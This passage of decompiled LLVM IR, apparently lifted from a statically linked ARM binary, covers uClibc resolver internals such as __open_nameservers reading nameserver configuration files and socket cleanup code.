  br i1 %v2_d3ac, label %dec_label_pc_d254, label %dec_label_pc_d3b0

dec_label_pc_d3b0:                                ; preds = %dec_label_pc_d284, %bb203, %dec_label_pc_d304, %dec_label_pc_d2d0, %bb205
  %v1_d3b4 = call i32 @__libc_close(i32 %v0_d094)
  %v3_d3b8 = load i32, i32* %stack_var_0, align 4
  %v2_d3bc = icmp eq i32 %v3_d3b8, 0
  br i1 %v2_d3bc, label %.thread26, label %bb206

bb206:                                            ; preds = %dec_label_pc_d3b0
  %v1_d3c4 = load i32, i32* @r7, align 4
  %v3_d3c0 = inttoptr i32 %v3_d3b8 to i32*
  store i32 %v1_d3c4, i32* %v3_d3c0, align 4
  br label %bb207

.thread26:                                        ; preds = %dec_label_pc_d3b0
  br label %bb207

bb207:                                            ; preds = %bb206, %.thread26
  store i32 54220, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_d3bc, i32 ptrtoint (i32* @global_var_b514.240 to i32))
  %v2_d3cc = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_ce60, i32* @r4, align 4
  %v1_d3d4 = call i32 @free(i32 %v2_d3cc)
  store i32 %v2_ce60, i32* @r0, align 4
  %v1_d3ec = call i32 @__pthread_return_void()
  %v1_d3fc = call i32 @__pthread_return_0()
  %v0_d408 = load i32, i32* @r6, align 4
  %v3_d408 = sdiv i32 %v0_d408, 256
  %v0_d40c = load i32, i32* @sl, align 4
  store i32 %v0_d40c, i32* @global_var_1bae8.226, align 4
  store i32 %v2_ce60, i32* @r0, align 4
  %v1_d418 = trunc i32 %v3_d408 to i8
  store i8 %v1_d418, i8* @global_var_1b711.229, align 1
  %v1_d41c = trunc i32 %v0_d408 to i8
  store i8 %v1_d41c, i8* bitcast (i8** @global_var_1b710.228 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_d42c.241 to i32), i32* @lr, align 4
  %v1_d428 = call i32 @__pthread_return_void()
  %v0_d5b4.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_d5b4

dec_label_pc_d430:                                ; preds = %dec_label_pc_d0c4, %dec_label_pc_d0e4
  %v0_d430 = load i32, i32* @sl, align 4
  %v1_d430 = add i32 %v0_d430, 1
  %v2_d438 = srem i32 %v1_d430, %arg3
  store i32 %v2_d438, i32* @sl, align 4
  %v2_d43c = icmp eq i32 %v2_d438, 0
  br i1 %v2_d43c, label %dec_label_pc_d444, label %dec_label_pc_d4fc.backedge

dec_label_pc_d444:                                ; preds = %dec_label_pc_d430
  %v1_d44c = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_d500.outer.backedge

dec_label_pc_d500.outer.backedge:                 ; preds = %dec_label_pc_d444, %dec_label_pc_d4e0, %.thread19
  %stack_var_-204.1.ph.be = phi i32 [ %v7_d1d8, %.thread19 ], [ -1, %dec_label_pc_d4e0 ], [ -1, %dec_label_pc_d444 ]
  %stack_var_-208.5.ph.be = phi i32 [ %stack_var_-208.567, %.thread19 ], [ %v1_d4e8, %dec_label_pc_d4e0 ], [ %v1_d44c, %dec_label_pc_d444 ]
  %tmp295 = icmp ult i32 %stack_var_-208.5.ph.be, 3
  br i1 %tmp295, label %dec_label_pc_cee4.lr.ph, label %dec_label_pc_d51c

dec_label_pc_d45c:                                ; preds = %dec_label_pc_d354
  %v1_d45c = inttoptr i32 %v0_d354 to i32*
  %v2_d45c = load i32, i32* %v1_d45c, align 4
  %v1_d460 = call i32 @free(i32 %v2_d45c)
  br label %dec_label_pc_d464

dec_label_pc_d464:                                ; preds = %dec_label_pc_d1f4, %dec_label_pc_d148, %dec_label_pc_d284, %dec_label_pc_d278, %dec_label_pc_d160, %dec_label_pc_d128, %dec_label_pc_d45c
  br i1 %v2_d468, label %dec_label_pc_d470, label %dec_label_pc_d4cc

dec_label_pc_d470:                                ; preds = %dec_label_pc_d464
  store i32 %v2_ce60, i32* @r5, align 4
  store i32 %v2_ce60, i32* @r0, align 4
  %v1_d488 = call i32 @__pthread_return_void()
  %v1_d498 = call i32 @__pthread_return_0()
  %v2_d4a4 = load i32, i32* @global_var_1dbb8.234, align 4
  store i32 %v2_ce60, i32* @r0, align 4
  %v1_d4b4 = call i32 @__pthread_return_void()
  %v1_d4bc = add i32 %v2_d4a4, -1
  store i32 %v1_d4bc, i32* @r4, align 4
  %v5_d4c4 = icmp slt i32 %v6_d4c4, %v1_d4bc
  br i1 %v5_d4c4, label %.thread27, label %dec_label_pc_d4cc

.thread27:                                        ; preds = %dec_label_pc_d470
  %v7_d4c4 = add i32 %v6_d4c4, 1
  br label %dec_label_pc_d4fc.backedge

dec_label_pc_d4cc:                                ; preds = %dec_label_pc_d470, %dec_label_pc_d464
  %v0_d4cc = load i32, i32* @sl, align 4
  %v1_d4cc = add i32 %v0_d4cc, 1
  %v2_d4d4 = srem i32 %v1_d4cc, %arg3
  store i32 %v2_d4d4, i32* @sl, align 4
  %v2_d4d8 = icmp eq i32 %v2_d4d4, 0
  br i1 %v2_d4d8, label %dec_label_pc_d4e0, label %dec_label_pc_d4fc.backedge

dec_label_pc_d4e0:                                ; preds = %dec_label_pc_d4cc
  %v1_d4e8 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_d500.outer.backedge

dec_label_pc_d4fc.backedge:                       ; preds = %dec_label_pc_d430, %dec_label_pc_d4cc, %.thread27
  %storemerge87 = phi i32 [ %v7_d4c4, %.thread27 ], [ -1, %dec_label_pc_d4cc ], [ -1, %dec_label_pc_d430 ]
  %tmp296 = icmp ult i32 %stack_var_-208.567, 3
  br i1 %tmp296, label %dec_label_pc_cee4.lr.ph.preheader, label %dec_label_pc_d51c

dec_label_pc_cee4.lr.ph.preheader:                ; preds = %dec_label_pc_cee4.lr.ph.preheader.lr.ph, %dec_label_pc_d4fc.backedge
  %stack_var_-216.0261 = phi i32 [ -1, %dec_label_pc_cee4.lr.ph.preheader.lr.ph ], [ %v0_d094, %dec_label_pc_d4fc.backedge ]
  %stack_var_-208.4260 = phi i32 [ %v0_cedc, %dec_label_pc_cee4.lr.ph.preheader.lr.ph ], [ %stack_var_-208.567, %dec_label_pc_d4fc.backedge ]
  %v0_d4fc259 = phi i32 [ -1, %dec_label_pc_cee4.lr.ph.preheader.lr.ph ], [ %storemerge87, %dec_label_pc_d4fc.backedge ]
  br label %dec_label_pc_cee4.lr.ph

dec_label_pc_cee4.lr.ph:                          ; preds = %dec_label_pc_cee4.lr.ph.preheader, %dec_label_pc_d500.outer.backedge
  %stack_var_-216.1.ph84 = phi i32 [ %v0_d094, %dec_label_pc_d500.outer.backedge ], [ %stack_var_-216.0261, %dec_label_pc_cee4.lr.ph.preheader ]
  %stack_var_-208.5.ph83 = phi i32 [ %stack_var_-208.5.ph.be, %dec_label_pc_d500.outer.backedge ], [ %stack_var_-208.4260, %dec_label_pc_cee4.lr.ph.preheader ]
  %v6_d4c4 = phi i32 [ %stack_var_-204.1.ph.be, %dec_label_pc_d500.outer.backedge ], [ %v0_d4fc259, %dec_label_pc_cee4.lr.ph.preheader ]
  %v1_cf8c = icmp slt i32 %v6_d4c4, 0
  %v4_cfc8 = mul i32 %v6_d4c4, 4
  %v5_cfc8 = add i32 %v4_cfc8, ptrtoint (i32* @global_var_1db98.238 to i32)
  %v6_cfc8 = inttoptr i32 %v5_cfc8 to i32*
  br label %dec_label_pc_cee4

dec_label_pc_d510:                                ; preds = %bb195, %.thread8, %dec_label_pc_ce3c, %dec_label_pc_ce30
  store i32 -1, i32* @sl, align 4
  store i32 -1, i32* @sb, align 4
  br label %dec_label_pc_d51c

dec_label_pc_d51c:                                ; preds = %dec_label_pc_ce4c, %dec_label_pc_d4fc.backedge, %dec_label_pc_d500.outer.backedge, %bb200, %dec_label_pc_cfd4, %dec_label_pc_d500.backedge, %dec_label_pc_d510
  %stack_var_-216.2 = phi i32 [ -1, %dec_label_pc_d510 ], [ %v0_d094, %dec_label_pc_d500.backedge ], [ %v1_ceec, %dec_label_pc_cfd4 ], [ %v1_ceec, %bb200 ], [ %v0_d094, %dec_label_pc_d500.outer.backedge ], [ -1, %dec_label_pc_ce4c ], [ %v0_d094, %dec_label_pc_d4fc.backedge ]
  %v0_d51c = call i32 @__GI___h_errno_location()
  %v2_d524 = inttoptr i32 %v0_d51c to i32*
  store i32 -1, i32* %v2_d524, align 4
  %v0_d528 = load i32, i32* @sb, align 4
  store i32 %v0_d528, i32* @r6, align 4
  br label %dec_label_pc_d52c

dec_label_pc_d52c:                                ; preds = %dec_label_pc_d218, %dec_label_pc_d51c
  %v1_d534 = phi i32 [ %stack_var_-216.2, %dec_label_pc_d51c ], [ %v0_d094, %dec_label_pc_d218 ]
  %v7_d530 = icmp eq i32 %v1_d534, -1
  br i1 %v7_d530, label %bb209, label %bb208

bb208:                                            ; preds = %dec_label_pc_d52c
  br label %bb209

bb209:                                            ; preds = %dec_label_pc_d52c, %bb208
  store i32 54588, i32* @lr, align 4
  %v1_d538 = xor i1 %v7_d530, true
  call void @__pseudo_cond_branch(i1 %v1_d538, i32 ptrtoint (i32* @global_var_a8c0.231 to i32))
  %v2_d53c = load i32, i32* %stack_var_-236, align 4
  %v1_d540 = call i32 @free(i32 %v2_d53c)
  %v0_d544 = load i32, i32* @r7, align 4
  %v1_d548 = call i32 @free(i32 %v0_d544)
  %v0_d54c = load i32, i32* @sl, align 4
  %v7_d54c = icmp eq i32 %v0_d54c, -1
  br i1 %v7_d54c, label %bb210, label %dec_label_pc_d558

bb210:                                            ; preds = %bb209
  br label %dec_label_pc_d5b4

dec_label_pc_d558:                                ; preds = %bb209
  %v2_d558 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_d558, i32* @r0, align 4
  %v1_d570 = call i32 @__pthread_return_void()
  %v1_d580 = call i32 @__pthread_return_0()
  %v0_d58c = load i32, i32* @r6, align 4
  %v3_d58c = sdiv i32 %v0_d58c, 256
  %v0_d590 = load i32, i32* @sl, align 4
  store i32 %v0_d590, i32* @global_var_1bae8.226, align 4
  store i32 %v2_d558, i32* @r0, align 4
  %v1_d59c = trunc i32 %v3_d58c to i8
  store i8 %v1_d59c, i8* @global_var_1b711.229, align 1
  %v1_d5a0 = trunc i32 %v0_d58c to i8
  store i8 %v1_d5a0, i8* bitcast (i8** @global_var_1b710.228 to i8*), align 4
  store i32 54704, i32* @lr, align 4
  %v1_d5ac = call i32 @__pthread_return_void()
  br label %dec_label_pc_d5b4

dec_label_pc_d5b4:                                ; preds = %bb210, %bb207, %dec_label_pc_d558
  %v0_d5b4 = phi i32 [ %v0_d54c, %bb210 ], [ %v0_d5b4.pre, %bb207 ], [ -1, %dec_label_pc_d558 ]
  store i32 %v3_cde8, i32* @r4, align 4
  store i32 %v6_cde8, i32* @r5, align 4
  store i32 %v9_cde8, i32* @r6, align 4
  store i32 %v12_cde8, i32* @r7, align 4
  store i32 %v15_cde8, i32* @r8, align 4
  store i32 %v18_cde8, i32* @sb, align 4
  store i32 %v21_cde8, i32* @sl, align 4
  ret i32 %v0_d5b4

; uselistorder directives
  uselistorder i32 %v0_d58c, { 1, 0 }
  uselistorder i32 %v0_d54c, { 1, 0 }
  uselistorder i1 %v7_d530, { 1, 0 }
  uselistorder i32 %v6_d4c4, { 2, 6, 3, 4, 1, 5, 0 }
  uselistorder i32 %stack_var_-208.5.ph.be, { 1, 0 }
  uselistorder i32 %v0_d408, { 1, 0 }
  uselistorder i32 %stack_var_-192.0, { 6, 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-212.2, { 1, 0 }
  uselistorder i32 %v0_d25c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_d354, { 0, 2, 1, 3 }
  uselistorder i32 %v1_d314, { 1, 0 }
  uselistorder i32 %v0_d234, { 1, 0 }
  uselistorder i32 %v0_d238, { 1, 0 }
  uselistorder i32 %v6_d138, { 1, 0 }
  uselistorder i32 %v0_d094, { 5, 0, 1, 2, 3, 4, 6, 8, 7, 10, 9, 12, 13, 11 }
  uselistorder i32 %v1_d000, { 1, 0 }
  uselistorder i32 %v2_cfa0, { 1, 0 }
  uselistorder i32 %v1_cf18, { 1, 2, 0 }
  uselistorder i1 %v7_cee8, { 1, 0 }
  uselistorder i32 %stack_var_-208.567, { 2, 1, 4, 5, 3, 0 }
  uselistorder i32 %v1_ceec, { 1, 2, 0 }
  uselistorder i32 %v0_cedc, { 1, 0 }
  uselistorder i32 %v2_ce60, { 6, 7, 8, 0, 1, 2, 3, 4, 5, 9, 10, 11, 12, 13 }
  uselistorder i32* %stack_var_-236, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i8* %stack_var_-188, { 4, 3, 1, 0, 2 }
  uselistorder i8* %stack_var_-100, { 3, 0, 2, 1 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %stack_var_-140, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32 %tmp155, { 2, 0, 4, 1, 3 }
  uselistorder i32 %tmp146, { 1, 0, 2 }
  uselistorder i32 %tmp, { 2, 1, 0 }
  uselistorder i32 (i32, %sockaddr*, i32)* @__libc_connect, { 0, 2, 1 }
  uselistorder i32 ()* @socket, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @inet_addr, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 2, 1, 0 }
  uselistorder i8* @global_var_1b711.229, { 2, 1, 0 }
  uselistorder i32 %arg2, { 2, 4, 5, 0, 1, 3 }
  uselistorder label %dec_label_pc_d5b4, { 2, 0, 1 }
  uselistorder label %bb209, { 1, 0 }
  uselistorder label %dec_label_pc_d52c, { 1, 0 }
  uselistorder label %dec_label_pc_d51c, { 6, 1, 2, 5, 4, 3, 0 }
  uselistorder label %dec_label_pc_d510, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_cee4.lr.ph.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_d4fc.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_d464, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_d500.outer.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d430, { 1, 0 }
  uselistorder label %bb207, { 1, 0 }
  uselistorder label %dec_label_pc_d3b0, { 4, 2, 1, 3, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %dec_label_pc_d39c, { 1, 0 }
  uselistorder label %dec_label_pc_d388, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d384, { 1, 0 }
  uselistorder label %dec_label_pc_d2ec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d228, { 1, 0 }
  uselistorder label %dec_label_pc_d218, { 1, 0 }
  uselistorder label %dec_label_pc_d500.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d080, { 1, 0 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_cfd4, { 2, 0, 1 }
  uselistorder label %bb200, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i64* %arg2) local_unnamed_addr {
dec_label_pc_d5c0:
  %v0_d5c0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d5c0, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_d5c0
  %tmp = ptrtoint i64* %arg2 to i32
  %v6_d5c0 = mul i32 %tmp, 256
  %v7_d5c0 = and i32 %v6_d5c0, %arg1
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_d5c0, %bb
  %v10_d5f0 = phi i32 [ %arg1, %dec_label_pc_d5c0 ], [ %v7_d5c0, %bb ]
  ret i32 %v10_d5f0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__open_nameservers(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_d5f4 = load i32, i32* @r4, align 4
  store i32 %v3_d5f4, i32* %stack_var_-28, align 4
  %v6_d5f4 = load i32, i32* @r5, align 4
  %v9_d5f4 = load i32, i32* @r6, align 4
  %v12_d5f4 = load i32, i32* @r7, align 4
  %v15_d5f4 = load i32, i32* @r8, align 4
  %v18_d5f4 = load i32, i32* @sl, align 4
  %v2_d5f8 = ptrtoint i32* %stack_var_-192 to i32
  %v2_d5fc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_d5fc, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1b714.88 to i32), i32* %r2.global-to-local, align 4
  %v1_d610 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_1b714.88 to i32), i32* %r0.global-to-local, align 4
  store i32 54820, i32* @lr, align 4
  %v1_d620 = call i32 @__pthread_return_0()
  store i32 %v1_d620, i32* %r0.global-to-local, align 4
  %v2_d628 = load i32, i32* @global_var_1dbb4.94, align 4
  %v5_d630 = icmp sgt i32 %v2_d628, 0
  br i1 %v5_d630, label %dec_label_pc_d86c, label %dec_label_pc_d634

dec_label_pc_d634:                                ; preds = %entry
  store i32 ptrtoint ([17 x i8]* @global_var_124c0.248 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_124d4.250 to i32), i32* @r1, align 4
  %v3_d63c = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_124c0.248 to i32), i32 ptrtoint (i32* @global_var_124d4.250 to i32))
  store i32 %v3_d63c, i32* %r0.global-to-local, align 4
  store i32 %v3_d63c, i32* @sl, align 4
  %v2_d640 = icmp eq i32 %v3_d63c, 0
  br i1 %v2_d640, label %dec_label_pc_d648, label %dec_label_pc_d834.preheader

dec_label_pc_d648:                                ; preds = %dec_label_pc_d634
  store i32 ptrtoint ([24 x i8]* @global_var_124d8.252 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_124d4.250 to i32), i32* @r1, align 4
  %v3_d650 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_124d8.252 to i32), i32 ptrtoint (i32* @global_var_124d4.250 to i32))
  store i32 %v3_d650, i32* %r0.global-to-local, align 4
  store i32 %v3_d650, i32* @sl, align 4
  %v2_d654 = icmp eq i32 %v3_d650, 0
  br i1 %v2_d654, label %dec_label_pc_d860, label %dec_label_pc_d834.preheader

dec_label_pc_d834.preheader:                      ; preds = %dec_label_pc_d634, %dec_label_pc_d648
  %v0_d83c26 = phi i32 [ %v3_d63c, %dec_label_pc_d634 ], [ %v3_d650, %dec_label_pc_d648 ]
  %v2_d6a8 = ptrtoint i32* %stack_var_-28 to i32
  %v3_d744 = inttoptr i32 %tmp to i8*
  store i32 %v2_d5f8, i32* %r0.global-to-local, align 4
  store i32 %v0_d83c26, i32* %r2.global-to-local, align 4
  %v3_d84066 = call i32 @fgets(i32 %v2_d5f8, i32 128, i32 %v0_d83c26)
  store i32 %v3_d84066, i32* %r0.global-to-local, align 4
  %v2_d84468 = icmp eq i32 %v3_d84066, 0
  store i32 %v2_d5f8, i32* @r4, align 4
  br i1 %v2_d84468, label %dec_label_pc_d854, label %dec_label_pc_d664.preheader.lr.ph

dec_label_pc_d664.preheader.lr.ph:                ; preds = %dec_label_pc_d834.preheader
  %v1_d66411 = bitcast i32* %stack_var_-192 to i8*
  br label %dec_label_pc_d664.preheader

dec_label_pc_d660:                                ; preds = %dec_label_pc_d670
  %v1_d660 = add i32 %v0_d660, 1
  store i32 %v1_d660, i32* %r0.global-to-local, align 4
  %v1_d664 = inttoptr i32 %v1_d660 to i8*
  %v2_d664 = load i8, i8* %v1_d664, align 1
  %v3_d664 = zext i8 %v2_d664 to i32
  store i32 %v3_d664, i32* %r2.global-to-local, align 4
  %v2_d668 = icmp eq i8 %v2_d664, 0
  br i1 %v2_d668, label %dec_label_pc_d684, label %dec_label_pc_d670

dec_label_pc_d670:                                ; preds = %dec_label_pc_d670.lr.ph, %dec_label_pc_d660
  %v0_d660 = phi i32 [ %v2_d5f8, %dec_label_pc_d670.lr.ph ], [ %v1_d660, %dec_label_pc_d660 ]
  %v1_d678 = phi i32 [ %v3_d66413, %dec_label_pc_d670.lr.ph ], [ %v3_d664, %dec_label_pc_d660 ]
  %v3_d678 = mul nuw nsw i32 %v1_d678, 2
  %v4_d678 = add i32 %v3_d678, %v2_d674.pre
  %v5_d678 = inttoptr i32 %v4_d678 to i8*
  %v6_d678 = load i8, i8* %v5_d678, align 1
  %v1_d67c = and i8 %v6_d678, 32
  %v2_d67c = icmp eq i8 %v1_d67c, 0
  br i1 %v2_d67c, label %dec_label_pc_d684, label %dec_label_pc_d660

dec_label_pc_d684:                                ; preds = %dec_label_pc_d660, %dec_label_pc_d670, %dec_label_pc_d664.preheader
  %v0_d71c35 = phi i32 [ %v2_d5f8, %dec_label_pc_d664.preheader ], [ %v1_d660, %dec_label_pc_d660 ], [ %v0_d660, %dec_label_pc_d670 ]
  %v0_d698 = phi i32 [ %v3_d66413, %dec_label_pc_d664.preheader ], [ %v3_d664, %dec_label_pc_d660 ], [ %v1_d678, %dec_label_pc_d670 ]
  %v7_d684 = icmp eq i32 %v0_d698, 10
  br i1 %v7_d684, label %.thread3, label %bb

bb:                                               ; preds = %dec_label_pc_d684
  %v3_d688 = icmp eq i32 %v0_d698, 0
  br i1 %v3_d688, label %bb55, label %dec_label_pc_d698

.thread3:                                         ; preds = %dec_label_pc_d684
  br label %dec_label_pc_d834.backedge

bb55:                                             ; preds = %bb
  br label %dec_label_pc_d834.backedge

dec_label_pc_d834.backedge:                       ; preds = %dec_label_pc_d810, %dec_label_pc_d828, %bb55, %dec_label_pc_d7a8, %.thread3, %dec_label_pc_d698
  %v0_d83c.pre = load i32, i32* @sl, align 4
  store i32 %v2_d5f8, i32* %r0.global-to-local, align 4
  store i32 %v0_d83c.pre, i32* %r2.global-to-local, align 4
  %v3_d840 = call i32 @fgets(i32 %v2_d5f8, i32 128, i32 %v0_d83c.pre)
  store i32 %v3_d840, i32* %r0.global-to-local, align 4
  %v2_d844 = icmp eq i32 %v3_d840, 0
  store i32 %v2_d5f8, i32* @r4, align 4
  br i1 %v2_d844, label %dec_label_pc_d854, label %dec_label_pc_d664.preheader

dec_label_pc_d698:                                ; preds = %bb
  %v7_d698 = icmp eq i32 %v0_d698, 35
  br i1 %v7_d698, label %dec_label_pc_d834.backedge, label %dec_label_pc_d71c

dec_label_pc_d6a8:                                ; preds = %bb58
  store i32 %v2_d6a8, i32* %r2.global-to-local, align 4
  %v4_d6ac = mul i32 %storemerge, 4
  %v5_d6ac = add i32 %v4_d6ac, %v2_d6a8
  %v2_d6b0 = add i32 %v5_d6ac, -36
  %v3_d6b0 = inttoptr i32 %v2_d6b0 to i32*
  store i32 %v0_d6b0, i32* %v3_d6b0, align 4
  %v0_d6bc15 = load i32, i32* %r0.global-to-local, align 4
  %v1_d6bc16 = inttoptr i32 %v0_d6bc15 to i8*
  %v2_d6bc17 = load i8, i8* %v1_d6bc16, align 1
  %v3_d6bc18 = zext i8 %v2_d6bc17 to i32
  store i32 %v3_d6bc18, i32* %r2.global-to-local, align 4
  %v2_d6c019 = icmp eq i8 %v2_d6bc17, 0
  br i1 %v2_d6c019, label %dec_label_pc_d6f0.preheader, label %dec_label_pc_d6c8.lr.ph

dec_label_pc_d6c8.lr.ph:                          ; preds = %dec_label_pc_d6a8
  %v2_d6cc.pre = load i32, i32* @global_var_1b514, align 4
  br label %dec_label_pc_d6c8

dec_label_pc_d6b8:                                ; preds = %dec_label_pc_d6dc
  %v1_d6b8 = add i32 %v0_d6b8, 1
  store i32 %v1_d6b8, i32* %r0.global-to-local, align 4
  %v1_d6bc = inttoptr i32 %v1_d6b8 to i8*
  %v2_d6bc = load i8, i8* %v1_d6bc, align 1
  %v3_d6bc = zext i8 %v2_d6bc to i32
  store i32 %v3_d6bc, i32* %r2.global-to-local, align 4
  %v2_d6c0 = icmp eq i8 %v2_d6bc, 0
  br i1 %v2_d6c0, label %dec_label_pc_d6f0.preheader, label %dec_label_pc_d6c8

dec_label_pc_d6c8:                                ; preds = %dec_label_pc_d6c8.lr.ph, %dec_label_pc_d6b8
  %v0_d6b8 = phi i32 [ %v0_d6bc15, %dec_label_pc_d6c8.lr.ph ], [ %v1_d6b8, %dec_label_pc_d6b8 ]
  %v0_d6dc = phi i32 [ %v3_d6bc18, %dec_label_pc_d6c8.lr.ph ], [ %v3_d6bc, %dec_label_pc_d6b8 ]
  %v3_d6d0 = mul nuw nsw i32 %v0_d6dc, 2
  %v4_d6d0 = add i32 %v3_d6d0, %v2_d6cc.pre
  %v5_d6d0 = inttoptr i32 %v4_d6d0 to i8*
  %v6_d6d0 = load i8, i8* %v5_d6d0, align 1
  %v1_d6d4 = and i8 %v6_d6d0, 32
  %v2_d6d4 = icmp eq i8 %v1_d6d4, 0
  br i1 %v2_d6d4, label %dec_label_pc_d6dc, label %dec_label_pc_d6f0.preheader

dec_label_pc_d6dc:                                ; preds = %dec_label_pc_d6c8
  %v7_d6dc = icmp eq i32 %v0_d6dc, 10
  br i1 %v7_d6dc, label %dec_label_pc_d6f0.preheader, label %dec_label_pc_d6b8

dec_label_pc_d6f0.preheader:                      ; preds = %dec_label_pc_d6dc, %dec_label_pc_d6c8, %dec_label_pc_d6b8, %dec_label_pc_d6a8
  %v0_d6f020 = phi i32 [ %v0_d6bc15, %dec_label_pc_d6a8 ], [ %v0_d6b8, %dec_label_pc_d6dc ], [ %v0_d6b8, %dec_label_pc_d6c8 ], [ %v1_d6b8, %dec_label_pc_d6b8 ]
  %v1_d6f021 = inttoptr i32 %v0_d6f020 to i8*
  %v2_d6f022 = load i8, i8* %v1_d6f021, align 1
  %v3_d6f023 = zext i8 %v2_d6f022 to i32
  store i32 %v3_d6f023, i32* %r2.global-to-local, align 4
  %v2_d6f424 = icmp eq i8 %v2_d6f022, 0
  br i1 %v2_d6f424, label %dec_label_pc_d718, label %dec_label_pc_d6fc

dec_label_pc_d6e8:                                ; preds = %dec_label_pc_d6fc, %dec_label_pc_d710
  %v3_d6ec = inttoptr i32 %v2_d6ec to i8*
  store i8 0, i8* %v3_d6ec, align 1
  %v4_d6ec = load i32, i32* %r0.global-to-local, align 4
  %v5_d6ec = add i32 %v4_d6ec, 1
  store i32 %v5_d6ec, i32* %r0.global-to-local, align 4
  %v1_d6f0 = inttoptr i32 %v5_d6ec to i8*
  %v2_d6f0 = load i8, i8* %v1_d6f0, align 1
  %v3_d6f0 = zext i8 %v2_d6f0 to i32
  store i32 %v3_d6f0, i32* %r2.global-to-local, align 4
  %v2_d6f4 = icmp eq i8 %v2_d6f0, 0
  br i1 %v2_d6f4, label %dec_label_pc_d718, label %dec_label_pc_d6fc

dec_label_pc_d6fc:                                ; preds = %dec_label_pc_d6f0.preheader, %dec_label_pc_d6e8
  %v0_d710 = phi i32 [ %v3_d6f0, %dec_label_pc_d6e8 ], [ %v3_d6f023, %dec_label_pc_d6f0.preheader ]
  %v2_d6ec = phi i32 [ %v5_d6ec, %dec_label_pc_d6e8 ], [ %v0_d6f020, %dec_label_pc_d6f0.preheader ]
  %v2_d700 = load i32, i32* @global_var_1b514, align 4
  %v3_d704 = mul nuw nsw i32 %v0_d710, 2
  %v4_d704 = add i32 %v2_d700, %v3_d704
  %v5_d704 = inttoptr i32 %v4_d704 to i8*
  %v6_d704 = load i8, i8* %v5_d704, align 1
  %v1_d708 = and i8 %v6_d704, 32
  %v2_d708 = icmp eq i8 %v1_d708, 0
  br i1 %v2_d708, label %dec_label_pc_d710, label %dec_label_pc_d6e8

dec_label_pc_d710:                                ; preds = %dec_label_pc_d6fc
  %v7_d710 = icmp eq i32 %v0_d710, 10
  br i1 %v7_d710, label %dec_label_pc_d6e8, label %dec_label_pc_d718

dec_label_pc_d718:                                ; preds = %dec_label_pc_d6e8, %dec_label_pc_d710, %dec_label_pc_d6f0.preheader
  %v0_d71c34 = phi i32 [ %v0_d6f020, %dec_label_pc_d6f0.preheader ], [ %v5_d6ec, %dec_label_pc_d6e8 ], [ %v2_d6ec, %dec_label_pc_d710 ]
  %v0_d718 = load i32, i32* @r8, align 4
  %v1_d718 = add i32 %v0_d718, 1
  br label %dec_label_pc_d71c

dec_label_pc_d71c:                                ; preds = %dec_label_pc_d698, %dec_label_pc_d718
  %storemerge = phi i32 [ %v1_d718, %dec_label_pc_d718 ], [ 0, %dec_label_pc_d698 ]
  %v0_d6b0 = phi i32 [ %v0_d71c34, %dec_label_pc_d718 ], [ %v0_d71c35, %dec_label_pc_d698 ]
  store i32 %storemerge, i32* @r8, align 4
  %v1_d71c = inttoptr i32 %v0_d6b0 to i8*
  %v2_d71c = load i8, i8* %v1_d71c, align 1
  %v3_d71c = zext i8 %v2_d71c to i32
  %v2_d720 = icmp eq i8 %v2_d71c, 0
  br i1 %v2_d720, label %bb57, label %bb56

bb56:                                             ; preds = %dec_label_pc_d71c
  br label %bb57

bb57:                                             ; preds = %dec_label_pc_d71c, %bb56
  %v0_d730.pr = phi i32 [ %v3_d71c, %dec_label_pc_d71c ], [ 1, %bb56 ]
  %v1_d728 = add i32 %storemerge, -4
  %v3_d728 = sub i32 3, %storemerge
  %v4_d728 = and i32 %v3_d728, %storemerge
  %v5_d728 = icmp slt i32 %v4_d728, 0
  %v6_d728 = icmp slt i32 %v1_d728, 0
  %v7_d728 = icmp eq i32 %storemerge, 4
  %v3_d72c = xor i1 %v6_d728, %v5_d728
  %v4_d72c = or i1 %v7_d728, %v3_d72c
  br i1 %v4_d72c, label %bb58, label %.thread5

.thread5:                                         ; preds = %bb57
  br label %dec_label_pc_d738

bb58:                                             ; preds = %bb57
  %v2_d730 = icmp eq i32 %v0_d730.pr, 0
